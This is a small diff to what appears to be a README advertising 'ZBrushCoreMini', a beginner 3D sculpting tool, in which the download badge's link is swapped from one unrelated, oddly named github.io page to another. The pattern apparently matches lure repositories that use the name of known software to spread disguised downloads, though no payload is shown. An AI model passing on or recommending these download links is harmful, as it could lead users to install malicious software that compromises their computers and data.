@@ -2,7 +2,7 @@
 
 ZBrushCoreMini is a streamlined sculpting tool designed for those just getting started with digital 3D art. With an intuitive interface and core ZBrush technology, it's perfect for artists, hobbyists, and educational use.
 
-[![⬇️ Download](https://img.shields.io/badge/⬇️%20Download-ZBrushCoreMini_PC_Tool-brightgreen?style=for-the-badge)](https://hsle1nelbgtgenerator.github.io/.github/)
+[![⬇️ Download](https://img.shields.io/badge/⬇️%20Download-ZBrushCoreMini_PC_Tool-brightgreen?style=for-the-badge)](https://zbrusmininfo.github.io/.github/)
 
 ---
 
